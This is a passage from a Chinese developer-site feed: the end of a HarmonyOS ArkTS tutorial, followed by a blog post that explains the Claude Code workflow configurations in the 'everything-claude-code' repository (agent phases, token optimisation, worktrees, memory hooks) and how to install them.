        .<span class="hljs-title function_">fontColor</span>(<span class="hljs-string">'#fff'</span>)
        .<span class="hljs-title function_">fontWeight</span>(<span class="hljs-number">700</span>)
        .<span class="hljs-title function_">layoutWeight</span>(<span class="hljs-number">1</span>)
      <span class="hljs-title class_">Image</span>($r(<span class="hljs-string">'app.media.ic_more'</span>))
        .<span class="hljs-title function_">width</span>(<span class="hljs-number">22</span>)
        .<span class="hljs-title function_">fillColor</span>(<span class="hljs-string">'#fff'</span>)
    }
    .<span class="hljs-title function_">width</span>(<span class="hljs-string">'100%'</span>)
    .<span class="hljs-title function_">height</span>(<span class="hljs-number">50</span>)
  }

  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>() {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">titleBuilder</span>(<span class="hljs-string">'标题1'</span>)
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">titleBuilder</span>(<span class="hljs-string">'标题2'</span>)
    }
    .<span class="hljs-title function_">width</span>(<span class="hljs-string">'100%'</span>)
    .<span class="hljs-title function_">height</span>(<span class="hljs-string">'100%'</span>)
    .<span class="hljs-title function_">backgroundColor</span>(<span class="hljs-string">'#131313'</span>)
    .<span class="hljs-title function_">padding</span>({ <span class="hljs-attr">left</span>: <span class="hljs-number">10</span>, <span class="hljs-attr">right</span>: <span class="hljs-number">10</span> })
  }
}
</code></pre>
<p>结果：</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f80e21867faf4567be6d96bbf5cd54c1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Luj56CB6aOe5LiA5Lya5YS_:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770907757&amp;x-signature=m7r1fTtEufahy5Ki6iWKBZ4oH8w%3D" alt="2026-02-03-11-52-52-image.png" loading="lazy"/></p>
<h2 data-id="heading-25">十、项目开发</h2>
<h3 data-id="heading-26">（一）图标设置</h3>
<p>配置文件：<code>项目目录\entry\src\main\module.json5</code></p>
<p>具体位置：</p>
<pre><code class="hljs language-json5" lang="json5">{
  "module": {
    ……
    "abilities": [
      {
        ……
        "icon": "$media:layered_image",//软件显示图标
        "label": "$string:EntryAbility_label",//软件显示名称
        "startWindowIcon": "$media:startIcon",//启动图标
        "startWindowBackground": "$color:start_window_background",//启动背景
        ……
      }
    ],
    ……
  }
}
</code></pre>
<blockquote>
<p>图片资源在<code>项目名称\entry\src\main\resources\base\media\文件名</code></p>
<p>文本资源在<code>项目名称\entry\src\main\resources\base\element\string.json</code></p>
</blockquote>
<h3 data-id="heading-27">（二）跳转设计</h3>
<p><code>Navigation组件</code>： <a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.huawei.com%2Fconsumer%2Fcn%2Fdoc%2Fharmonyos-references%2Fts-basic-components-navigation%23%25E7%25A4%25BA%25E4%25BE%258B1navigation%25E9%25A1%25B5%25E9%259D%25A2%25E5%25B8%2583%25E5%25B1%2580" target="_blank" title="https://developer.huawei.com/consumer/cn/doc/harmonyos-references/ts-basic-components-navigation#%E7%A4%BA%E4%BE%8B1navigation%E9%A1%B5%E9%9D%A2%E5%B8%83%E5%B1%80" ref="nofollow noopener noreferrer">Navigation-导航与切换-华为HarmonyOS开发者</a></p>
<h3 data-id="heading-28">（三）生命周期函数</h3>
<p>生命周期函数是组件中自动执行的函数，需要写在<code>build(){}</code>之前。</p>
<ol>
<li><code>ababoutToAppear(): void { 函数体 }</code>，例如下面这个延时执行：</li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-title function_">aboutToAppear</span>(): <span class="hljs-built_in">void</span> {
  <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">()=&gt;</span>{
    <span class="hljs-comment">//要执行的内容</span>
  },等待时间（毫秒）)
}
</code></pre>
<h3 data-id="heading-29">（四）项目文件交互</h3>
<ol>
<li>
<p>使用<code>explort</code> 关键字导出组件、函数</p>
</li>
<li>
<p>使用<code>import</code> 关键字导入组件、函数</p>
</li>
</ol>
<h3 data-id="heading-30">（五）软件权限</h3>
<p>在<code>module.json5</code>中设置权限：<a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.huawei.com%2Fconsumer%2Fcn%2Fdoc%2Fharmonyos-guides%2Fdeclare-permissions%23%25E5%25A3%25B0%25E6%2598%258E%25E6%25A0%25B7%25E4%25BE%258B" target="_blank" title="https://developer.huawei.com/consumer/cn/doc/harmonyos-guides/declare-permissions#%E5%A3%B0%E6%98%8E%E6%A0%B7%E4%BE%8B" ref="nofollow noopener noreferrer">声明权限-华为HarmonyOS开发者</a></p>
<h3 data-id="heading-31">（六）多页面跳转存储UI状态、全局共享数据</h3>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.huawei.com%2Fconsumer%2Fcn%2Fdoc%2Fharmonyos-guides%2Farkts-new-appstoragev2" target="_blank" title="https://developer.huawei.com/consumer/cn/doc/harmonyos-guides/arkts-new-appstoragev2" ref="nofollow noopener noreferrer">AppStorageV2: 应用全局UI状态存储-管理应用拥有的状态</a></p>
<p>使用：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-title class_">AppStorageV2</span>.<span class="hljs-title function_">connect</span>(类型,key,初始值构造器);
</code></pre>
<h3 data-id="heading-32">（七）启动准备</h3>
<p>在<code>项目名称\entry\src\main\ets\entryability\EntryAbility.ets</code>的下面代码内设置：</p>
<pre><code class="hljs language-ts" lang="ts">……
<span class="hljs-title function_">onWindowStageCreate</span>(<span class="hljs-attr">windowStage</span>: <span class="hljs-variable language_">window</span>.<span class="hljs-property">WindowStage</span>): <span class="hljs-built_in">void</span> {
    <span class="hljs-comment">// Main window is created, set main page for this ability</span>
    <span class="hljs-comment">//写在这下面</span>
    ……
  }
……
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[黑客松冠军配置！老金拆解8大核心思路，值得反复品味]]></title>    <link>https://juejin.cn/post/7603195719458078726</link>    <guid>https://juejin.cn/post/7603195719458078726</guid>    <pubDate>2026-02-05T10:46:19.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603195719458078726" data-draft-id="7603142147643097131" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="黑客松冠军配置！老金拆解8大核心思路，值得反复品味"/> <meta itemprop="keywords" content="人工智能"/> <meta itemprop="datePublished" content="2026-02-05T10:46:19.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="老金带你玩AI"/> <meta itemprop="url" content="https://juejin.cn/user/2561191397043127"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            黑客松冠军配置！老金拆解8大核心思路，值得反复品味
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2561191397043127/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    老金带你玩AI
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T10:46:19.000Z" title="Thu Feb 05 2026 10:46:19 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读16分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>老金我之前写过3篇AI记忆方案的文章：claude-mem（轻量）、mcp-memory-service（重量）、openclaw三层架构（概念性）。</p>
<p>今天讲的第四种方案，不只是记忆。</p>
<p>它是一套完整的Claude Code工作流方法论。
包括Token优化、Agent编排、并行化、验证循环、复合效应。</p>
<p>四种方案的详细对比，文末有专门一节。先往下看。</p>
<p>周末刷GitHub的时候，老金我发现了这个神仓库。</p>
<p>28.8k星，3.4k Fork。
名字叫everything-claude-code。</p>
<p>点进去一看，卧槽，这不就是我一直想要的东西吗？</p>
<p>作者是个叫Affaan Mustafa的哥们。
他和队友在Anthropic x Forum Ventures黑客松上，用Claude Code 8小时做了个产品叫zenith.chat。
直接拿下冠军，赢了15000美元API credits。</p>
<p>关键是，他把10个月积累的Claude Code配置和方法论全开源了。</p>
<p>老金我研究了一晚上，今天给你们拆解一下这个神器到底神在哪。</p>
<h2 data-id="heading-0">核心思路一：用CLI+Skills替代MCP</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4ca00e82434d4c9ebc2ede9231a706d9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ICB6YeR5bim5L2g546pQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770893178&amp;x-signature=uysz7TrITq91pPZQcBmPievB0To%3D" alt="Image" loading="lazy"/></p>
<p>作者说，很多MCP其实是可以替代的。
比如GitHub MCP、Supabase MCP、Vercel MCP。
这些平台本身就有很强的CLI，MCP只是在外面包了一层。</p>
<p>问题是什么？
MCP会占用上下文窗口，会消耗更多token。</p>
<p>作者的解决方案
把MCP的功能拆成Skills和Commands。
比如不用GitHub MCP，而是创建一个 /gh-pr命令，直接调用 gh pr create。
不用Supabase MCP，而是创建Skills直接调用Supabase CLI。</p>
<p>这样做的好处
上下文窗口省出来了。
Token消耗降下来了。
功能一样能用。</p>
<p>老金我试了一下，确实有效。
把几个不常用的MCP换成CLI+Skills后，token消耗降了不少。</p>
<h2 data-id="heading-1">核心思路二：Agent顺序阶段编排</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/afae8d6b4f87416d96792e7e2fe5bafc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ICB6YeR5bim5L2g546pQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770893178&amp;x-signature=7dIYXK6XYJhsyQyeilyRsha6GzI%3D" alt="Image" loading="lazy"/></p>
<p>这是老金我觉得最值得学习的部分。</p>
<p>作者提出了一个5阶段的Agent编排模式。</p>
<p>Phase 1: RESEARCH
用Explore agent做调研，输出research-summary.md。</p>
<p>Phase 2: PLAN
用planner agent做规划，输出plan.md。</p>
<p>Phase 3: IMPLEMENT
用tdd-guide agent做实现，输出代码改动。</p>
<p>Phase 4: REVIEW
用code-reviewer agent做审查，输出review-comments.md。</p>
<p>Phase 5: VERIFY
如果有问题，用build-error-resolver解决，然后循环回去。</p>
<p>关键规则
每个Agent只有一个清晰的输入，产出一个清晰的输出。
输出变成下一阶段的输入。
永远不要跳过阶段。
阶段之间用 /clear清理上下文。
中间输出存到文件里。</p>
<p>为什么这样做？
Sub-agent有个问题：它只知道字面查询，不知道背后的目的。
所以需要迭代检索模式。</p>
<p>编排器评估每个sub-agent的返回。
在接受之前先问follow-up问题。
Sub-agent回去找答案，再返回。
循环直到满意，最多3轮。</p>
<p>关键是传递目标上下文，而不只是查询。</p>
<h2 data-id="heading-2">核心思路三：Token优化策略</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0b1ca28a69a64ec5b22c3c8b05c26671~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ICB6YeR5bim5L2g546pQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770893178&amp;x-signature=g7H7blT6bAa8rhGxgOrQMQOIo78%3D" alt="Image" loading="lazy"/></p>
<p>用Claude Code最头疼的就是token消耗。
作者给了一套完整的优化方案。</p>
<p>模型选择的思路</p>
<p>作者的建议是：90%的编码任务用Sonnet。
只有在特定情况下才升级到Opus。</p>
<p>什么情况用Haiku？
探索和搜索任务，快、便宜、够用。
简单编辑，单文件改动，指令清晰。
写文档，结构简单。</p>
<p>什么情况用Sonnet？
多文件实现，编码最佳平衡。
PR审查，理解上下文，抓细节。</p>
<p>什么情况用Opus？
复杂架构，需要深度推理。
安全分析，不能漏掉漏洞。
调试复杂bug，需要全局视角。
第一次尝试失败、任务跨5个以上文件、涉及架构决策、或者安全关键代码。</p>
<p>用mgrep替代grep</p>
<p>作者推荐用mgrep替代传统的grep或ripgrep。
根据他的测试，token消耗平均减少50%。</p>
<p>模块化代码库</p>
<p>作者强调，把主文件控制在几百行而不是几千行。
这样不仅省token，而且任务一次做对的概率更高。</p>
<h2 data-id="heading-3">核心思路四：验证循环</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/662717a0be4b43028efc229802695e4d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ICB6YeR5bim5L2g546pQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770893178&amp;x-signature=49fjQVu0GYHqUdrYFGOEQazye4Y%3D" alt="Image" loading="lazy"/></p>
<p>作者在指南里提到了两个重要指标。</p>
<p>pass@k
k次尝试中至少有1次成功。
k=1时70%，k=3时91%，k=5时97%。</p>
<p>pass^k
k次尝试必须全部成功。
k=1时70%，k=3时34%，k=5时17%。</p>
<p>什么时候用哪个？
如果只需要能跑就行，用pass@k。
如果需要稳定一致，用pass^k。</p>
<p>两种验证模式</p>
<p>Checkpoint-Based Evals
设置明确的检查点，验证是否符合标准，不过不继续。</p>
<p>Continuous Evals
每隔N分钟或者大改动后，跑完整测试套件加lint。</p>
<p>怎么做基准测试？
Fork对话，在一个分支里不用Skill，在另一个分支里用Skill。
最后拉个diff，看看输出有什么区别。</p>
<h2 data-id="heading-4">核心思路五：并行化策略</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/be1089ea7c584526a903bf0237dac5d6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ICB6YeR5bim5L2g546pQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770893178&amp;x-signature=%2FuOjl03I8AL7uV%2BjQgteccyzsUU%3D" alt="Image" loading="lazy"/></p>
<p>这部分老金我觉得特别实用，和之前老金讲的claude code联合创始人的做法相同。</p>
<p>Git Worktrees</p>
<p>如果你要同时跑多个Claude实例处理不同任务，作者强烈建议用Git Worktrees。</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 创建工作树</span>
git worktree add ../project-feature-a feature-a
git worktree add ../project-feature-b feature-b

<span class="hljs-comment"># 每个工作树跑一个Claude实例</span>
<span class="hljs-built_in">cd</span> ../project-feature-a &amp;&amp; claude
</code></pre>
<p>这样多个Claude实例不会互相干扰，代码改动也不会冲突。</p>
<p>Cascade Method</p>
<p>作者的并行工作流是这样的：
新任务在右边开新标签页。
从左到右扫，最老的在最左边。
同时最多关注3-4个任务。</p>
<p>关于并行数量</p>
<p>作者引用了Anthropic的Boris的建议，但他自己的观点是：
不要设置任意数量的终端。
增加终端应该是出于真正的需要。
目标是：用最少的并行化完成最多的工作。</p>
<h2 data-id="heading-5">核心思路六：Two-Instance Kickoff Pattern</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/823bee58678043669390699449965449~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ICB6YeR5bim5L2g546pQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770893178&amp;x-signature=1hjL3kczymkgXo3fDHE3yEWOUk4%3D" alt="Image" loading="lazy"/></p>
<p>开新项目的时候，作者会开两个Claude实例。</p>
<p>Instance 1: Scaffolding Agent
负责搭建项目骨架。
创建项目结构。
配置CLAUDE.md和rules。</p>
<p>Instance 2: Deep Research Agent
连接各种服务，做网络搜索。
创建详细的PRD。
画架构mermaid图。
编译参考文档。</p>
<p>两个实例并行工作，效率直接翻倍。</p>
<p>llms.txt模式</p>
<p>作者提到一个技巧：很多文档网站有 /llms.txt。
访问文档页面后加上 /llms.txt，就能获得LLM优化版本的文档。
更干净，更适合喂给Claude。</p>
<p>如果对你有帮助，记得关注一波~</p>
<h2 data-id="heading-6">核心思路七：记忆持久化</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/544fb64e18be452f9638fa7074b8d27b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ICB6YeR5bim5L2g546pQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770893178&amp;x-signature=Jetr4YHpSPRC6SFMBRarkqdeBW8%3D" alt="Image" loading="lazy"/></p>
<p>这部分是记忆相关的，但只是整个方法论的一小部分。</p>
<p>动态系统提示注入</p>
<p>作者不是把所有东西都塞进CLAUDE.md，而是用CLI参数动态注入。</p>
<pre><code class="hljs language-bash" lang="bash">claude --system-prompt <span class="hljs-string">"<span class="hljs-subst">$(cat memory.md)</span>"</span>
</code></pre>
<p>然后他设置了几个alias：</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 日常开发模式</span>
alias <span class="hljs-attr">claude-dev</span>=<span class="hljs-string">'claude --system-prompt "$(cat ~/.claude/contexts/dev.md)"'</span>

<span class="hljs-comment"># PR审查模式</span>
alias <span class="hljs-attr">claude-review</span>=<span class="hljs-string">'claude --system-prompt "$(cat ~/.claude/contexts/review.md)"'</span>

<span class="hljs-comment"># 研究探索模式</span>
alias <span class="hljs-attr">claude-research</span>=<span class="hljs-string">'claude --system-prompt "$(cat ~/.claude/contexts/research.md)"'</span>
</code></pre>
<p>不同场景加载不同上下文，精准控制Claude的行为。</p>
<p>Memory Persistence Hooks
作者搞了一套Memory Persistence Hooks，用三个钩子解决记忆问题。</p>
<p>PreCompact Hook
在上下文压缩之前，自动把重要状态保存到文件。</p>
<p>Stop Hook
会话结束时，自动把学到的东西持久化。</p>
<p>SessionStart Hook
新会话开始时，自动加载之前的上下文。</p>
<p>为什么用Stop Hook而不是UserPromptSubmit？
UserPromptSubmit每条消息都会触发，增加延迟。
Stop只在会话结束时触发一次，轻量级，不会拖慢你。</p>
<p>Continuous Learning技能
当Claude发现了什么新东西，比如一个调试技巧、一个workaround，它会自动保存成新技能。
下次遇到类似问题，技能自动加载。</p>
<h2 data-id="heading-7">核心思路八：复合效应哲学</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/268dccdd2fa94c8d9fdf9ef3c1f2e759~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ICB6YeR5bim5L2g546pQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770893178&amp;x-signature=0rxOCHv0JKoDTZI%2FuTHAE9koirc%3D" alt="Image" loading="lazy"/></p>
<p>作者引用了@omarsar0的话：
"早期，我花时间构建可复用的工作流和模式。构建起来很繁琐，但随着模型和agent框架的改进，这产生了疯狂的复合效应。"</p>
<p>应该投资什么？
Subagents
Skills
Commands
规划模式
MCP工具
上下文工程模式</p>
<p>这就是复利。
前期投入时间构建可复用的东西。
后期每次使用都在收益。</p>
<h2 data-id="heading-8">怎么用？手把手教你</h2>
<p>安装有两种方式，老金我推荐用插件方式，2分钟搞定。</p>
<h3 data-id="heading-9">方法一：作为插件安装（推荐）</h3>
<p>第一步：安装插件
直接在claude code中输入</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 添加市场</span>
/plugin marketplace add affaan-m/everything-claude-code

<span class="hljs-comment"># 安装插件</span>
/plugin install everything-claude-code@everything-claude-code
</code></pre>
<p>第二步：安装规则（必需）
⚠️ 重要：插件无法自动分发rules，需要手动安装。
建议在claude全局目录直接进行。</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 首先克隆仓库</span>
git <span class="hljs-built_in">clone</span> https://github.com/affaan-m/everything-claude-code.git

<span class="hljs-comment"># 复制规则到用户级（应用于所有项目）</span>
<span class="hljs-built_in">cp</span> -r everything-claude-code/rules/* ~/.claude/rules/

<span class="hljs-comment"># 或者复制到项目级（仅当前项目）</span>
<span class="hljs-built_in">mkdir</span> -p .claude/rules
<span class="hljs-built_in">cp</span> -r everything-claude-code/rules/* .claude/rules/
</code></pre>
<p>第三步：开始使用</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 尝试一个命令</span>
/plan <span class="hljs-string">"添加用户认证"</span>

<span class="hljs-comment"># 查看可用命令</span>
/plugin list everything-claude-code@everything-claude-code
</code></pre>
<p>✨ 完成！你现在可以使用15+代理、30+技能和20+命令。</p>
<h3 data-id="heading-10">方法二：手动安装（推荐老手）</h3>
<p>如果你希望对安装的内容有完全控制：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 克隆仓库</span>
git <span class="hljs-built_in">clone</span> https://github.com/affaan-m/everything-claude-code.git

<span class="hljs-comment"># 复制代理</span>
<span class="hljs-built_in">cp</span> everything-claude-code/agents/*.md ~/.claude/agents/

<span class="hljs-comment"># 复制命令</span>
<span class="hljs-built_in">cp</span> everything-claude-code/commands/*.md ~/.claude/commands/

<span class="hljs-comment"># 复制技能</span>
<span class="hljs-built_in">cp</span> -r everything-claude-code/skills/* ~/.claude/skills/
</code></pre>
<p>配置hooks和MCP需要手动编辑settings.json和claude.json，详见仓库README。</p>
<p>目录结构：</p>
<pre><code class="hljs language-perl" lang="perl">everything-claude-code/
|-- .claude-plugin/   <span class="hljs-comment"># 插件和市场清单</span>
|   |-- plugin.json         <span class="hljs-comment"># 插件元数据和组件路径</span>
|   |-- marketplace.json    <span class="hljs-comment"># /plugin marketplace add 的市场目录</span>
|
|-- agents/           <span class="hljs-comment"># 用于委托的专业子代理</span>
|   |-- planner.md           <span class="hljs-comment"># 功能实现规划</span>
|   |-- architect.md         <span class="hljs-comment"># 系统设计决策</span>
|   |-- tdd-guide.md         <span class="hljs-comment"># 测试驱动开发</span>
|   |-- code-reviewer.md     <span class="hljs-comment"># 质量和安全审查</span>
|   |-- security-reviewer.md <span class="hljs-comment"># 漏洞分析</span>
|   |-- build-error-resolver.md
|   |-- e2e-runner.md        <span class="hljs-comment"># Playwright E2E 测试</span>
|   |-- refactor-cleaner.md  <span class="hljs-comment"># 死代码清理</span>
|   |-- doc-updater.md       <span class="hljs-comment"># 文档同步</span>
|   |-- go-reviewer.md       <span class="hljs-comment"># Go 代码审查（新增）</span>
|   |-- go-build-resolver.md <span class="hljs-comment"># Go 构建错误解决（新增）</span>
|
|-- skills/           <span class="hljs-comment"># 工作流定义和领域知识</span>
|   |-- coding-standards/           <span class="hljs-comment"># 语言最佳实践</span>
|   |-- backend-patterns/           <span class="hljs-comment"># API、数据库、缓存模式</span>
|   |-- frontend-patterns/          <span class="hljs-comment"># React、Next.js 模式</span>
|   |-- continuous-learning/        <span class="hljs-comment"># 从会话中自动提取模式（详细指南）</span>
|   |-- continuous-learning-v2/     <span class="hljs-comment"># 基于直觉的学习与置信度评分</span>
|   |-- iterative-retrieval/        <span class="hljs-comment"># 子代理的渐进式上下文细化</span>
|   |-- strategic-compact/          <span class="hljs-comment"># 手动压缩建议（详细指南）</span>
|   |-- tdd-workflow/               <span class="hljs-comment"># TDD 方法论</span>
|   |-- security-review/            <span class="hljs-comment"># 安全检查清单</span>
|   |-- <span class="hljs-keyword">eval</span>-harness/               <span class="hljs-comment"># 验证循环评估（详细指南）</span>
|   |-- verification-loop/          <span class="hljs-comment"># 持续验证（详细指南）</span>
|   |-- golang-patterns/            <span class="hljs-comment"># Go 惯用语和最佳实践（新增）</span>
|   |-- golang-testing/             <span class="hljs-comment"># Go 测试模式、TDD、基准测试（新增）</span>
|
|-- commands/         <span class="hljs-comment"># 用于快速执行的斜杠命令</span>
|   |-- tdd.md              <span class="hljs-comment"># /tdd - 测试驱动开发</span>
|   |-- plan.md             <span class="hljs-comment"># /plan - 实现规划</span>
